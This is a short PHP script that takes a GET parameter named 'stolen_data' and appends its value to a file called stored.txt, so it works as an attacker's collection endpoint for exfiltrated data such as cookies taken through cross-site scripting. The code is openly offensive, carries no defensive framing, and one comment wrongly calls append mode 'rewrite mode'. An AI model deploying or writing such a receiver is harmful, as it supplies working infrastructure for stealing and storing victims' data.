<?php
$getvar1 = $_GET['stolen_data'];

// file name
$fileName = "stored.txt";

// open the file name in rewrite mode
$file = fopen($fileName, "a");

// check if the file was opened successfully
if ($file) {
    // write the text string to the file
    fwrite($file, $getvar1);

    // close the file
    fclose($file);

    echo "string written to file";
} else {
    echo "some error occured";
}

?>
